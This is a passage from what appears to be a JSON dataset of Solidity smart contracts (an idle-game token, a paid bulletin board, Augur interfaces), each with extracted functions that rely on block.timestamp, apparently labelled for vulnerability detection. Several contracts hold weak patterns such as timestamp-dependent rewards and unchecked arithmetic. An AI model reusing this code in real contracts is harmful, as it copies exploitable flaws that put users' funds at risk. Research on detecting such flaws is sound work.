    "function redeem(string username, uint karma, uint sigExp, uint8 sigV, bytes32 sigR, bytes32 sigS) public {\nrequire(\necrecover(\nkeccak256(abi.encodePacked(this, username, karma, sigExp)),\nsigV, sigR, sigS\n) == oracle\n);\nrequire(block.timestamp < sigExp);\nrequire(karma > redeemedKarma[username]);\nuint newUserKarma = karma - redeemedKarma[username];\nbalanceOf[msg.sender] = safeAdd(balanceOf[msg.sender], newUserKarma);\nuint newMaintainerKarma = newUserKarma / 100;\nbalanceOf[maintainer] = safeAdd(balanceOf[maintainer], newMaintainerKarma);\ntotalSupply = safeAdd(totalSupply, safeAdd(newUserKarma, newMaintainerKarma));\nredeemedKarma[username] = karma;\nemit Redeem(username, msg.sender, newUserKarma);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f07"
  },
  "filename": "6149.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract AccessAdmin is Ownable {\n mapping (address => bool) adminContracts;\n mapping (address => bool) actionContracts;\n function setAdminContract(address _addr, bool _useful) public onlyOwner {\n require(_addr != address(0));\n adminContracts[_addr] = _useful;\n }\n modifier onlyAdmin {\n require(adminContracts[msg.sender]);\n _;\n }\n function setActionContract(address _actionAddr, bool _useful) public onlyAdmin {\n actionContracts[_actionAddr] = _useful;\n }\n modifier onlyAccess() {\n require(actionContracts[msg.sender]);\n _;\n }\n}\ninterface ERC20 {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract JadeCoin is ERC20, AccessAdmin {\n using SafeMath for SafeMath;\n string public constant name = \"MAGICACADEMY JADE\";\n string public constant symbol = \"Jade\";\n uint8 public constant decimals = 0;\n uint256 public roughSupply;\n uint256 public totalJadeProduction;\n uint256[] public totalJadeProductionSnapshots;\n uint256 public nextSnapshotTime;\n uint256 public researchDivPercent = 10;\n mapping(address => uint256) public jadeBalance;\n mapping(address => mapping(uint8 => uint256)) public coinBalance;\n mapping(uint8 => uint256) totalEtherPool;\n mapping(address => mapping(uint256 => uint256)) public jadeProductionSnapshots;\n mapping(address => mapping(uint256 => bool)) private jadeProductionZeroedSnapshots;\n mapping(address => uint256) public lastJadeSaveTime;\n mapping(address => uint256) public lastJadeProductionUpdate;\n mapping(address => uint256) private lastJadeResearchFundClaim;\n mapping(address => uint256) private lastJadeDepositFundClaim;\n uint256[] private allocatedJadeResearchSnapshots;\n mapping(address => mapping(address => uint256)) private allowed;\n event ReferalGain(address player, address referal, uint256 amount);\n function JadeCoin() public {\n }\n function() external payable {\n totalEtherPool[1] += msg.value;\n }\n function tweakDailyDividends(uint256 newResearchPercent) external {\n require(msg.sender == owner);\n require(newResearchPercent > 0 && newResearchPercent <= 10);\n researchDivPercent = newResearchPercent;\n }\n function totalSupply() public constant returns(uint256) {\n return roughSupply;\n }\n function balanceOf(address player) public constant returns(uint256) {\n return SafeMath.add(jadeBalance[player],balanceOfUnclaimed(player));\n }\n function balanceOfUnclaimed(address player) public constant returns (uint256) {\n uint256 lSave = lastJadeSaveTime[player];\n if (lSave > 0 && lSave < block.timestamp) {\n return SafeMath.mul(getJadeProduction(player),SafeMath.div(SafeMath.sub(block.timestamp,lSave),100));\n }\n return 0;\n }\n function getJadeProduction(address player) public constant returns (uint256){\n return jadeProductionSnapshots[player][lastJadeProductionUpdate[player]];\n }\n function getTotalJadeProduction() external view returns (uint256) {\n return totalJadeProduction;\n }\n function getlastJadeProductionUpdate(address player) public view returns (uint256) {\n return lastJadeProductionUpdate[player];\n }\n function increasePlayersJadeProduction(address player, uint256 increase) public onlyAccess {\n jadeProductionSnapshots[player][allocatedJadeResearchSnapshots.length] = SafeMath.add(getJadeProduction(player),increase);\n lastJadeProductionUpdate[player] = allocatedJadeResearchSnapshots.length;\n totalJadeProduction = SafeMath.add(totalJadeProduction,increase);\n }\n function reducePlayersJadeProduction(address player, uint256 decrease) public onlyAccess {\n uint256 previousProduction = getJadeProduction(player);\n uint256 newProduction = SafeMath.sub(previousProduction, decrease);\n if (newProduction == 0) {\n jadeProductionZeroedSnapshots[player][allocatedJadeResearchSnapshots.length] = true;\n delete jadeProductionSnapshots[player][allocatedJadeResearchSnapshots.length];\n } else {\n jadeProductionSnapshots[player][allocatedJadeResearchSnapshots.length] = newProduction;\n }\n lastJadeProductionUpdate[player] = allocatedJadeResearchSnapshots.length;\n totalJadeProduction = SafeMath.sub(totalJadeProduction,decrease);\n }\n function updatePlayersCoin(address player) internal {\n uint256 coinGain = balanceOfUnclaimed(player);\n lastJadeSaveTime[player] = block.timestamp;\n roughSupply = SafeMath.add(roughSupply,coinGain);\n jadeBalance[player] = SafeMath.add(jadeBalance[player],coinGain);\n }\n function updatePlayersCoinByOut(address player) external onlyAccess {\n uint256 coinGain = balanceOfUnclaimed(player);\n lastJadeSaveTime[player] = block.timestamp;\n roughSupply = SafeMath.add(roughSupply,coinGain);\n jadeBalance[player] = SafeMath.add(jadeBalance[player],coinGain);\n }\n function transfer(address recipient, uint256 amount) public returns (bool) {\n updatePlayersCoin(msg.sender);\n require(amount <= jadeBalance[msg.sender]);\n jadeBalance[msg.sender] = SafeMath.sub(jadeBalance[msg.sender],amount);\n jadeBalance[recipient] = SafeMath.add(jadeBalance[recipient],amount);\n Transfer(msg.sender, recipient, amount);\n return true;\n }\n function transferFrom(address player, address recipient, uint256 amount) public returns (bool) {\n updatePlayersCoin(player);\n require(amount <= allowed[player][msg.sender] && amount <= jadeBalance[player]);\n jadeBalance[player] = SafeMath.sub(jadeBalance[player],amount);\n jadeBalance[recipient] = SafeMath.add(jadeBalance[recipient],amount);\n allowed[player][msg.sender] = SafeMath.sub(allowed[player][msg.sender],amount);\n Transfer(player, recipient, amount);\n return true;\n }\n function approve(address approvee, uint256 amount) public returns (bool) {\n allowed[msg.sender][approvee] = amount;\n Approval(msg.sender, approvee, amount);\n return true;\n }\n function allowance(address player, address approvee) public constant returns(uint256) {\n return allowed[player][approvee];\n }\n function updatePlayersCoinByPurchase(address player, uint256 purchaseCost) public onlyAccess {\n uint256 unclaimedJade = balanceOfUnclaimed(player);\n if (purchaseCost > unclaimedJade) {\n uint256 jadeDecrease = SafeMath.sub(purchaseCost, unclaimedJade);\n require(jadeBalance[player] >= jadeDecrease);\n roughSupply = SafeMath.sub(roughSupply,jadeDecrease);\n jadeBalance[player] = SafeMath.sub(jadeBalance[player],jadeDecrease);\n } else {\n uint256 jadeGain = SafeMath.sub(unclaimedJade,purchaseCost);\n roughSupply = SafeMath.add(roughSupply,jadeGain);\n jadeBalance[player] = SafeMath.add(jadeBalance[player],jadeGain);\n }\n lastJadeSaveTime[player] = block.timestamp;\n }\n function JadeCoinMining(address _addr, uint256 _amount) external onlyAdmin {\n roughSupply = SafeMath.add(roughSupply,_amount);\n jadeBalance[_addr] = SafeMath.add(jadeBalance[_addr],_amount);\n }\n function setRoughSupply(uint256 iroughSupply) external onlyAccess {\n roughSupply = SafeMath.add(roughSupply,iroughSupply);\n }\n function coinBalanceOf(address player,uint8 itype) external constant returns(uint256) {\n return coinBalance[player][itype];\n }\n function setJadeCoin(address player, uint256 coin, bool iflag) external onlyAccess {\n if (iflag) {\n jadeBalance[player] = SafeMath.add(jadeBalance[player],coin);\n } else if (!iflag) {\n jadeBalance[player] = SafeMath.sub(jadeBalance[player],coin);\n }\n }\n function setCoinBalance(address player, uint256 eth, uint8 itype, bool iflag) external onlyAccess {\n if (iflag) {\n coinBalance[player][itype] = SafeMath.add(coinBalance[player][itype],eth);\n } else if (!iflag) {\n coinBalance[player][itype] = SafeMath.sub(coinBalance[player][itype],eth);\n }\n }\n function setLastJadeSaveTime(address player) external onlyAccess {\n lastJadeSaveTime[player] = block.timestamp;\n }\n function setTotalEtherPool(uint256 inEth, uint8 itype, bool iflag) external onlyAccess {\n if (iflag) {\n totalEtherPool[itype] = SafeMath.add(totalEtherPool[itype],inEth);\n } else if (!iflag) {\n totalEtherPool[itype] = SafeMath.sub(totalEtherPool[itype],inEth);\n }\n }\n function getTotalEtherPool(uint8 itype) external view returns (uint256) {\n return totalEtherPool[itype];\n }\n function setJadeCoinZero(address player) external onlyAccess {\n jadeBalance[player]=0;\n }\n function getNextSnapshotTime() external view returns(uint256) {\n return nextSnapshotTime;\n }\n function viewUnclaimedResearchDividends() external constant returns (uint256, uint256, uint256) {\n uint256 startSnapshot = lastJadeResearchFundClaim[msg.sender];\n uint256 latestSnapshot = allocatedJadeResearchSnapshots.length - 1;\n uint256 researchShare;\n uint256 previousProduction = jadeProductionSnapshots[msg.sender][lastJadeResearchFundClaim[msg.sender] - 1];\n for (uint256 i = startSnapshot; i <= latestSnapshot; i++) {\n uint256 productionDuringSnapshot = jadeProductionSnapshots[msg.sender][i];\n bool soldAllProduction = jadeProductionZeroedSnapshots[msg.sender][i];\n if (productionDuringSnapshot == 0 && !soldAllProduction) {\n productionDuringSnapshot = previousProduction;\n } else {\n previousProduction = productionDuringSnapshot;\n }\n researchShare += (allocatedJadeResearchSnapshots[i] * productionDuringSnapshot) / totalJadeProductionSnapshots[i];\n }\n return (researchShare, startSnapshot, latestSnapshot);\n }\n function claimResearchDividends(address referer, uint256 startSnapshot, uint256 endSnapShot) external {\n require(startSnapshot <= endSnapShot);\n require(startSnapshot >= lastJadeResearchFundClaim[msg.sender]);\n require(endSnapShot < allocatedJadeResearchSnapshots.length);\n uint256 researchShare;\n uint256 previousProduction = jadeProductionSnapshots[msg.sender][lastJadeResearchFundClaim[msg.sender] - 1];\n for (uint256 i = startSnapshot; i <= endSnapShot; i++) {\n uint256 productionDuringSnapshot = jadeProductionSnapshots[msg.sender][i];\n bool soldAllProduction = jadeProductionZeroedSnapshots[msg.sender][i];\n if (productionDuringSnapshot == 0 && !soldAllProduction) {\n productionDuringSnapshot = previousProduction;\n } else {\n previousProduction = productionDuringSnapshot;\n }\n researchShare += (allocatedJadeResearchSnapshots[i] * productionDuringSnapshot) / totalJadeProductionSnapshots[i];\n }\n if (jadeProductionSnapshots[msg.sender][endSnapShot] == 0 && !jadeProductionZeroedSnapshots[msg.sender][endSnapShot] && previousProduction > 0) {\n jadeProductionSnapshots[msg.sender][endSnapShot] = previousProduction;\n }\n lastJadeResearchFundClaim[msg.sender] = endSnapShot + 1;\n uint256 referalDivs;\n if (referer != address(0) && referer != msg.sender) {\n referalDivs = researchShare / 100;\n coinBalance[referer][1] += referalDivs;\n ReferalGain(referer, msg.sender, referalDivs);\n }\n coinBalance[msg.sender][1] += SafeMath.sub(researchShare,referalDivs);\n }\n function snapshotDailyGooResearchFunding() external onlyAdmin {\n uint256 todaysGooResearchFund = (totalEtherPool[1] * researchDivPercent) / 100;\n totalEtherPool[1] -= todaysGooResearchFund;\n totalJadeProductionSnapshots.push(totalJadeProduction);\n allocatedJadeResearchSnapshots.push(todaysGooResearchFund);\n nextSnapshotTime = block.timestamp + 24 hours;\n }\n}\ninterface GameConfigInterface {\n function productionCardIdRange() external constant returns (uint256, uint256);\n function battleCardIdRange() external constant returns (uint256, uint256);\n function upgradeIdRange() external constant returns (uint256, uint256);\n function unitCoinProduction(uint256 cardId) external constant returns (uint256);\n function unitAttack(uint256 cardId) external constant returns (uint256);\n function unitDefense(uint256 cardId) external constant returns (uint256);\n function unitStealingCapacity(uint256 cardId) external constant returns (uint256);\n}\ncontract CardsBase is JadeCoin {\n function CardsBase() public {\n setAdminContract(msg.sender,true);\n setActionContract(msg.sender,true);\n }\n struct Player {\n address owneraddress;\n }\n Player[] players;\n bool gameStarted;\n GameConfigInterface public schema;\n mapping(address => mapping(uint256 => uint256)) public unitsOwned;\n mapping(address => mapping(uint256 => uint256)) public upgradesOwned;\n mapping(address => uint256) public uintsOwnerCount;\n mapping(address=> mapping(uint256 => uint256)) public uintProduction;\n mapping(address => mapping(uint256 => uint256)) public unitCoinProductionIncreases;\n mapping(address => mapping(uint256 => uint256)) public unitCoinProductionMultiplier;\n mapping(address => mapping(uint256 => uint256)) public unitAttackIncreases;\n mapping(address => mapping(uint256 => uint256)) public unitAttackMultiplier;\n mapping(address => mapping(uint256 => uint256)) public unitDefenseIncreases;\n mapping(address => mapping(uint256 => uint256)) public unitDefenseMultiplier;\n mapping(address => mapping(uint256 => uint256)) public unitJadeStealingIncreases;\n mapping(address => mapping(uint256 => uint256)) public unitJadeStealingMultiplier;\n mapping(address => mapping(uint256 => uint256)) private unitMaxCap;\n function setConfigAddress(address _address) external onlyOwner {\n schema = GameConfigInterface(_address);\n }\n function beginGame(uint256 firstDivsTime) external payable onlyOwner {\n require(!gameStarted);\n gameStarted = true;\n nextSnapshotTime = firstDivsTime;\n totalEtherPool[1] = msg.value;\n }\n function endGame() external payable onlyOwner {\n require(gameStarted);\n gameStarted = false;\n }\n function getGameStarted() external constant returns (bool) {\n return gameStarted;\n }\n function AddPlayers(address _address) external onlyAccess {\n Player memory _player= Player({\n owneraddress: _address\n });\n players.push(_player);\n }\n function getRanking() external view returns (address[], uint256[],uint256[]) {\n uint256 len = players.length;\n uint256[] memory arr = new uint256[](len);\n address[] memory arr_addr = new address[](len);\n uint256[] memory arr_def = new uint256[](len);\n uint counter =0;\n for (uint k=0;k<len; k++){\n arr[counter] = getJadeProduction(players[k].owneraddress);\n arr_addr[counter] = players[k].owneraddress;\n (,arr_def[counter],,) = getPlayersBattleStats(players[k].owneraddress);\n counter++;\n }\n for(uint i=0;i<len-1;i++) {\n for(uint j=0;j<len-i-1;j++) {\n if(arr[j]<arr[j+1]) {\n uint256 temp = arr[j];\n address temp_addr = arr_addr[j];\n uint256 temp_def = arr_def[j];\n arr[j] = arr[j+1];\n arr[j+1] = temp;\n arr_addr[j] = arr_addr[j+1];\n arr_addr[j+1] = temp_addr;\n arr_def[j] = arr_def[j+1];\n arr_def[j+1] = temp_def;\n }\n }\n }\n return (arr_addr,arr,arr_def);\n }\n function getTotalUsers() external view returns (uint256) {\n return players.length;\n }\n function getMaxCap(address _addr,uint256 _cardId) external view returns (uint256) {\n return unitMaxCap[_addr][_cardId];\n }\n function getUnitsProduction(address player, uint256 unitId, uint256 amount) external constant returns (uint256) {\n return (amount * (schema.unitCoinProduction(unitId) + unitCoinProductionIncreases[player][unitId]) * (10 + unitCoinProductionMultiplier[player][unitId]));\n }\n function getUnitsInProduction(address player, uint256 unitId, uint256 amount) external constant returns (uint256) {\n return SafeMath.div(SafeMath.mul(amount,uintProduction[player][unitId]),unitsOwned[player][unitId]);\n }\n function getUnitsAttack(address player, uint256 unitId, uint256 amount) internal constant returns (uint256) {\n return (amount * (schema.unitAttack(unitId) + unitAttackIncreases[player][unitId]) * (10 + unitAttackMultiplier[player][unitId])) / 10;\n }\n function getUnitsDefense(address player, uint256 unitId, uint256 amount) internal constant returns (uint256) {\n return (amount * (schema.unitDefense(unitId) + unitDefenseIncreases[player][unitId]) * (10 + unitDefenseMultiplier[player][unitId])) / 10;\n }\n function getUnitsStealingCapacity(address player, uint256 unitId, uint256 amount) internal constant returns (uint256) {\n return (amount * (schema.unitStealingCapacity(unitId) + unitJadeStealingIncreases[player][unitId]) * (10 + unitJadeStealingMultiplier[player][unitId])) / 10;\n }\n function getPlayersBattleStats(address player) public constant returns (\n uint256 attackingPower,\n uint256 defendingPower,\n uint256 stealingPower,\n uint256 battlePower) {\n uint256 startId;\n uint256 endId;\n (startId, endId) = schema.battleCardIdRange();\n while (startId <= endId) {\n attackingPower = SafeMath.add(attackingPower,getUnitsAttack(player, startId, unitsOwned[player][startId]));\n stealingPower = SafeMath.add(stealingPower,getUnitsStealingCapacity(player, startId, unitsOwned[player][startId]));\n defendingPower = SafeMath.add(defendingPower,getUnitsDefense(player, startId, unitsOwned[player][startId]));\n battlePower = SafeMath.add(attackingPower,defendingPower);\n startId++;\n }\n }\n function getOwnedCount(address player, uint256 cardId) external view returns (uint256) {\n return unitsOwned[player][cardId];\n }\n function setOwnedCount(address player, uint256 cardId, uint256 amount, bool iflag) external onlyAccess {\n if (iflag) {\n unitsOwned[player][cardId] = SafeMath.add(unitsOwned[player][cardId],amount);\n } else if (!iflag) {\n unitsOwned[player][cardId] = SafeMath.sub(unitsOwned[player][cardId],amount);\n }\n }\n function getUpgradesOwned(address player, uint256 upgradeId) external view returns (uint256) {\n return upgradesOwned[player][upgradeId];\n }\n function setUpgradesOwned(address player, uint256 upgradeId) external onlyAccess {\n upgradesOwned[player][upgradeId] = SafeMath.add(upgradesOwned[player][upgradeId],1);\n }\n function getUintsOwnerCount(address _address) external view returns (uint256) {\n return uintsOwnerCount[_address];\n }\n function setUintsOwnerCount(address _address, uint256 amount, bool iflag) external onlyAccess {\n if (iflag) {\n uintsOwnerCount[_address] = SafeMath.add(uintsOwnerCount[_address],amount);\n } else if (!iflag) {\n uintsOwnerCount[_address] = SafeMath.sub(uintsOwnerCount[_address],amount);\n }\n }\n function getUnitCoinProductionIncreases(address _address, uint256 cardId) external view returns (uint256) {\n return unitCoinProductionIncreases[_address][cardId];\n }\n function setUnitCoinProductionIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitCoinProductionIncreases[_address][cardId] = SafeMath.add(unitCoinProductionIncreases[_address][cardId],iValue);\n } else if (!iflag) {\n unitCoinProductionIncreases[_address][cardId] = SafeMath.sub(unitCoinProductionIncreases[_address][cardId],iValue);\n }\n }\n function getUnitCoinProductionMultiplier(address _address, uint256 cardId) external view returns (uint256) {\n return unitCoinProductionMultiplier[_address][cardId];\n }\n function setUnitCoinProductionMultiplier(address _address, uint256 cardId, uint256 iValue, bool iflag) external onlyAccess {\n if (iflag) {\n unitCoinProductionMultiplier[_address][cardId] = SafeMath.add(unitCoinProductionMultiplier[_address][cardId],iValue);\n } else if (!iflag) {\n unitCoinProductionMultiplier[_address][cardId] = SafeMath.sub(unitCoinProductionMultiplier[_address][cardId],iValue);\n }\n }\n function setUnitAttackIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitAttackIncreases[_address][cardId] = SafeMath.add(unitAttackIncreases[_address][cardId],iValue);\n } else if (!iflag) {\n unitAttackIncreases[_address][cardId] = SafeMath.sub(unitAttackIncreases[_address][cardId],iValue);\n }\n }\n function getUnitAttackIncreases(address _address, uint256 cardId) external view returns (uint256) {\n return unitAttackIncreases[_address][cardId];\n }\n function setUnitAttackMultiplier(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitAttackMultiplier[_address][cardId] = SafeMath.add(unitAttackMultiplier[_address][cardId],iValue);\n } else if (!iflag) {\n unitAttackMultiplier[_address][cardId] = SafeMath.sub(unitAttackMultiplier[_address][cardId],iValue);\n }\n }\n function getUnitAttackMultiplier(address _address, uint256 cardId) external view returns (uint256) {\n return unitAttackMultiplier[_address][cardId];\n }\n function setUnitDefenseIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitDefenseIncreases[_address][cardId] = SafeMath.add(unitDefenseIncreases[_address][cardId],iValue);\n } else if (!iflag) {\n unitDefenseIncreases[_address][cardId] = SafeMath.sub(unitDefenseIncreases[_address][cardId],iValue);\n }\n }\n function getUnitDefenseIncreases(address _address, uint256 cardId) external view returns (uint256) {\n return unitDefenseIncreases[_address][cardId];\n }\n function setunitDefenseMultiplier(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitDefenseMultiplier[_address][cardId] = SafeMath.add(unitDefenseMultiplier[_address][cardId],iValue);\n } else if (!iflag) {\n unitDefenseMultiplier[_address][cardId] = SafeMath.sub(unitDefenseMultiplier[_address][cardId],iValue);\n }\n }\n function getUnitDefenseMultiplier(address _address, uint256 cardId) external view returns (uint256) {\n return unitDefenseMultiplier[_address][cardId];\n }\n function setUnitJadeStealingIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitJadeStealingIncreases[_address][cardId] = SafeMath.add(unitJadeStealingIncreases[_address][cardId],iValue);\n } else if (!iflag) {\n unitJadeStealingIncreases[_address][cardId] = SafeMath.sub(unitJadeStealingIncreases[_address][cardId],iValue);\n }\n }\n function getUnitJadeStealingIncreases(address _address, uint256 cardId) external view returns (uint256) {\n return unitJadeStealingIncreases[_address][cardId];\n }\n function setUnitJadeStealingMultiplier(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitJadeStealingMultiplier[_address][cardId] = SafeMath.add(unitJadeStealingMultiplier[_address][cardId],iValue);\n } else if (!iflag) {\n unitJadeStealingMultiplier[_address][cardId] = SafeMath.sub(unitJadeStealingMultiplier[_address][cardId],iValue);\n }\n }\n function getUnitJadeStealingMultiplier(address _address, uint256 cardId) external view returns (uint256) {\n return unitJadeStealingMultiplier[_address][cardId];\n }\n function setUintCoinProduction(address _address, uint256 cardId, uint256 iValue, bool iflag) external onlyAccess {\n if (iflag) {\n uintProduction[_address][cardId] = SafeMath.add(uintProduction[_address][cardId],iValue);\n } else if (!iflag) {\n uintProduction[_address][cardId] = SafeMath.sub(uintProduction[_address][cardId],iValue);\n }\n }\n function getUintCoinProduction(address _address, uint256 cardId) external view returns (uint256) {\n return uintProduction[_address][cardId];\n }\n function upgradeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external onlyAccess {\n uint256 productionGain;\n if (upgradeClass == 0) {\n unitCoinProductionIncreases[player][unitId] += upgradeValue;\n productionGain = unitsOwned[player][unitId] * upgradeValue * (10 + unitCoinProductionMultiplier[player][unitId]);\n increasePlayersJadeProduction(player, productionGain);\n } else if (upgradeClass == 1) {\n unitCoinProductionMultiplier[player][unitId] += upgradeValue;\n productionGain = unitsOwned[player][unitId] * upgradeValue * (schema.unitCoinProduction(unitId) + unitCoinProductionIncreases[player][unitId]);\n increasePlayersJadeProduction(player, productionGain);\n } else if (upgradeClass == 2) {\n unitAttackIncreases[player][unitId] += upgradeValue;\n } else if (upgradeClass == 3) {\n unitAttackMultiplier[player][unitId] += upgradeValue;\n } else if (upgradeClass == 4) {\n unitDefenseIncreases[player][unitId] += upgradeValue;\n } else if (upgradeClass == 5) {\n unitDefenseMultiplier[player][unitId] += upgradeValue;\n } else if (upgradeClass == 6) {\n unitJadeStealingIncreases[player][unitId] += upgradeValue;\n } else if (upgradeClass == 7) {\n unitJadeStealingMultiplier[player][unitId] += upgradeValue;\n } else if (upgradeClass == 8) {\n unitMaxCap[player][unitId] = upgradeValue;\n }\n }\n function removeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external onlyAccess {\n uint256 productionLoss;\n if (upgradeClass == 0) {\n unitCoinProductionIncreases[player][unitId] -= upgradeValue;\n productionLoss = unitsOwned[player][unitId] * upgradeValue * (10 + unitCoinProductionMultiplier[player][unitId]);\n reducePlayersJadeProduction(player, productionLoss);\n } else if (upgradeClass == 1) {\n unitCoinProductionMultiplier[player][unitId] -= upgradeValue;\n productionLoss = unitsOwned[player][unitId] * upgradeValue * (schema.unitCoinProduction(unitId) + unitCoinProductionIncreases[player][unitId]);\n reducePlayersJadeProduction(player, productionLoss);\n } else if (upgradeClass == 2) {\n unitAttackIncreases[player][unitId] -= upgradeValue;\n } else if (upgradeClass == 3) {\n unitAttackMultiplier[player][unitId] -= upgradeValue;\n } else if (upgradeClass == 4) {\n unitDefenseIncreases[player][unitId] -= upgradeValue;\n } else if (upgradeClass == 5) {\n unitDefenseMultiplier[player][unitId] -= upgradeValue;\n } else if (upgradeClass == 6) {\n unitJadeStealingIncreases[player][unitId] -= upgradeValue;\n } else if (upgradeClass == 7) {\n unitJadeStealingMultiplier[player][unitId] -= upgradeValue;\n }\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function balanceOfUnclaimed(address player) public constant returns (uint256) {\nuint256 lSave = lastJadeSaveTime[player];\nif (lSave > 0 && lSave < block.timestamp) {\nreturn SafeMath.mul(getJadeProduction(player),SafeMath.div(SafeMath.sub(block.timestamp,lSave),100));\n}\nreturn 0;\n}",
    "function updatePlayersCoin(address player) internal {\nuint256 coinGain = balanceOfUnclaimed(player);\nlastJadeSaveTime[player] = block.timestamp;\nroughSupply = SafeMath.add(roughSupply,coinGain);\njadeBalance[player] = SafeMath.add(jadeBalance[player],coinGain);\n}",
    "function updatePlayersCoinByOut(address player) external onlyAccess {\nuint256 coinGain = balanceOfUnclaimed(player);\nlastJadeSaveTime[player] = block.timestamp;\nroughSupply = SafeMath.add(roughSupply,coinGain);\njadeBalance[player] = SafeMath.add(jadeBalance[player],coinGain);\n}",
    "function updatePlayersCoinByPurchase(address player, uint256 purchaseCost) public onlyAccess {\nuint256 unclaimedJade = balanceOfUnclaimed(player);\nif (purchaseCost > unclaimedJade) {\nuint256 jadeDecrease = SafeMath.sub(purchaseCost, unclaimedJade);\nrequire(jadeBalance[player] >= jadeDecrease);\nroughSupply = SafeMath.sub(roughSupply,jadeDecrease);\njadeBalance[player] = SafeMath.sub(jadeBalance[player],jadeDecrease);\n} else {\nuint256 jadeGain = SafeMath.sub(unclaimedJade,purchaseCost);\nroughSupply = SafeMath.add(roughSupply,jadeGain);\njadeBalance[player] = SafeMath.add(jadeBalance[player],jadeGain);\n}\nlastJadeSaveTime[player] = block.timestamp;\n}",
    "function setLastJadeSaveTime(address player) external onlyAccess {\nlastJadeSaveTime[player] = block.timestamp;\n}",
    "function snapshotDailyGooResearchFunding() external onlyAdmin {\nuint256 todaysGooResearchFund = (totalEtherPool[1] * researchDivPercent) / 100;\ntotalEtherPool[1] -= todaysGooResearchFund;\ntotalJadeProductionSnapshots.push(totalJadeProduction);\nallocatedJadeResearchSnapshots.push(todaysGooResearchFund);\nnextSnapshotTime = block.timestamp + 24 hours;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f08"
  },
  "filename": "6199.sol",
  "content": "pragma solidity ^0.4.24;\ncontract BulletinBoard {\n struct Message {\n address sender;\n string text;\n uint timestamp;\n uint payment;\n }\n Message[] public messages;\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n function addMessage(string text) public payable {\n require(msg.value >= 0.000001 ether * bytes(text).length);\n messages.push(Message(msg.sender, text, block.timestamp, msg.value));\n }\n function numMessages() public constant returns (uint) {\n return messages.length;\n }\n function withdraw() public {\n require(msg.sender == owner);\n msg.sender.transfer(address(this).balance);\n }\n}",
  "extract_feature": [
    "function addMessage(string text) public payable {\nrequire(msg.value >= 0.000001 ether * bytes(text).length);\nmessages.push(Message(msg.sender, text, block.timestamp, msg.value));\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f09"
  },
  "filename": "6207.sol",
  "content": "pragma solidity 0.4.20;\ncontract IAugur {\n function createChildUniverse(bytes32 _parentPayoutDistributionHash, uint256[] _parentPayoutNumerators, bool _parentInvalid) public returns (IUniverse);\n function isKnownUniverse(IUniverse _universe) public view returns (bool);\n function trustedTransfer(ERC20 _token, address _from, address _to, uint256 _amount) public returns (bool);\n function logMarketCreated(bytes32 _topic, string _description, string _extraInfo, IUniverse _universe, address _market, address _marketCreator, bytes32[] _outcomes, int256 _minPrice, int256 _maxPrice, IMarket.MarketType _marketType) public returns (bool);\n function logMarketCreated(bytes32 _topic, string _description, string _extraInfo, IUniverse _universe, address _market, address _marketCreator, int256 _minPrice, int256 _maxPrice, IMarket.MarketType _marketType) public returns (bool);\n function logInitialReportSubmitted(IUniverse _universe, address _reporter, address _market, uint256 _amountStaked, bool _isDesignatedReporter, uint256[] _payoutNumerators, bool _invalid) public returns (bool);\n function disputeCrowdsourcerCreated(IUniverse _universe, address _market, address _disputeCrowdsourcer, uint256[] _payoutNumerators, uint256 _size, bool _invalid) public returns (bool);\n function logDisputeCrowdsourcerContribution(IUniverse _universe, address _reporter, address _market, address _disputeCrowdsourcer, uint256 _amountStaked) public returns (bool);\n function logDisputeCrowdsourcerCompleted(IUniverse _universe, address _market, address _disputeCrowdsourcer) public returns (bool);\n function logInitialReporterRedeemed(IUniverse _universe, address _reporter, address _market, uint256 _amountRedeemed, uint256 _repReceived, uint256 _reportingFeesReceived, uint256[] _payoutNumerators) public returns (bool);\n function logDisputeCrowdsourcerRedeemed(IUniverse _universe, address _reporter, address _market, uint256 _amountRedeemed, uint256 _repReceived, uint256 _reportingFeesReceived, uint256[] _payoutNumerators) public returns (bool);\n function logFeeWindowRedeemed(IUniverse _universe, address _reporter, uint256 _amountRedeemed, uint256 _reportingFeesReceived) public returns (bool);\n function logMarketFinalized(IUniverse _universe) public returns (bool);\n function logMarketMigrated(IMarket _market, IUniverse _originalUniverse) public returns (bool);\n function 